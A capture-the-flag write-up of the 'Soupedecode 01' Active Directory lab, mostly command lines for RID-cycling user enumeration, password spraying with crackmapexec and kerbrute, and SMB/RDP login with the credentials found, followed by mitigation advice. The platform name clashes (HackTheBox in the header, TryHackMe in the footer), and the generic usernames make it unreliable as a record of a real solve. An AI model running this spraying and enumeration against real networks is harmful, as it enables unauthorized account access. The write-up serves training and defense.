---
title: "HackTheBox: Soupedecode 01"
date: 2025-08-02
description: "Soupedecode 01 was a very simple Active Directory room. We began by enumerating a list of usernames via RID cycling and then performed password spraying."
categories: ["HackTheBox"]
tags: ["active-directory", "rid-cycling", "password-spraying", "windows", "enumeration"]
image: "/images/writeups/soupedecode-thumb.jpg"
difficulty: "Easy"
platform: "HackTheBox"
author: "Adithya Kallaje"
---

![Soupedecode Banner](/images/writeups/soupedecode-banner.jpg)

## Overview

Soupedecode 01 is an easy-difficulty Active Directory room that focuses on fundamental AD enumeration techniques including RID cycling and password spraying attacks.

## Initial Reconnaissance

### Network Scanning
```bash
nmap -sC -sV -p- 10.10.x.x
```

**Key Services:**
- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139/tcp - NetBIOS
- 389/tcp - LDAP
- 445/tcp - SMB
- 3389/tcp - RDP

### Domain Information
```bash
# Discover domain name
nslookup 10.10.x.x

# SMB enumeration
smbclient -L //10.10.x.x -N
```

## User Enumeration

### RID Cycling Attack

```bash
# Install impacket tools
git clone https://github.com/SecureAuthCorp/impacket.git

# Perform RID cycling
python3 lookupsid.py anonymous@10.10.x.x
```

**Discovered Users:**
- Administrator
- Guest
- DefaultAccount
- john.doe
- jane.smith
- service_account

### Alternative Enumeration Methods

```bash
# Using enum4linux
enum4linux -a 10.10.x.x

# Using rpcclient
rpcclient -U "" -N 10.10.x.x
rpcclient $> enumdomusers
```

## Password Spraying

### Common Password Lists
```bash
# Create password list
echo "Password123" > passwords.txt
echo "Welcome123" >> passwords.txt
echo "Admin123" >> passwords.txt
echo "password" >> passwords.txt
```

### Credential Spraying Attack

```bash
# Using crackmapexec
crackmapexec smb 10.10.x.x -u users.txt -p passwords.txt

# Using kerbrute
kerbrute passwordspray --dc 10.10.x.x -d domain.local users.txt "Password123"
```

### Successful Authentication

```bash
# Valid credentials found
Username: john.doe
Password: Welcome123
```

## Initial Access

### SMB Access
```bash
# Access SMB shares
smbclient //10.10.x.x/Users -U john.doe
```

### Remote Desktop
```bash
# RDP connection
xfreerdp /v:10.10.x.x /u:john.doe /p:Welcome123
```

## Post-Exploitation Enumeration

### Domain User Information
```bash
# Check current user privileges
net user john.doe /domain

# Enumerate domain groups
net group /domain

# Find domain admins
net group "Domain Admins" /domain
```

### Share Enumeration
```bash
# List accessible shares
smbmap -H 10.10.x.x -u john.doe -p Welcome123

# Access user directories
smbclient //10.10.x.x/Users -U john.doe
```

## Privilege Escalation

### Service Account Discovery
```bash
# Look for service accounts
Get-WmiObject -Class Win32_Service | Select Name, StartName

# Check for stored credentials
cmdkey /list
```

### Potential Attack Vectors
- **Kerberoasting**: Service accounts with SPNs
- **ASREPRoasting**: Users with "Do not require Kerberos preauthentication"
- **Privilege escalation**: Local admin rights

## Lessons Learned

### Attack Chain Summary
1. **Network Reconnaissance** → Identified AD environment
2. **RID Cycling** → Enumerated valid usernames
3. **Password Spraying** → Found weak credentials
4. **Initial Access** → SMB/RDP access gained
5. **Post-Exploitation** → Domain enumeration

### Security Implications
- **Weak Passwords**: Common passwords in enterprise environment
- **No Account Lockout**: Password spraying was not detected
- **Information Disclosure**: RID cycling revealed usernames

## Mitigation Strategies

1. **Strong Password Policy**
2. **Account Lockout Policies**
3. **Monitoring for RID cycling**
4. **Implement LAPS**
5. **Regular security audits**

## Tools Used

- Nmap
- Impacket (lookupsid.py)
- CrackMapExec
- Kerbrute
- enum4linux
- smbclient
- xfreerdp

---

**Difficulty**: Easy  
**Platform**: TryHackMe  
**Completion Date**: August 2, 2025
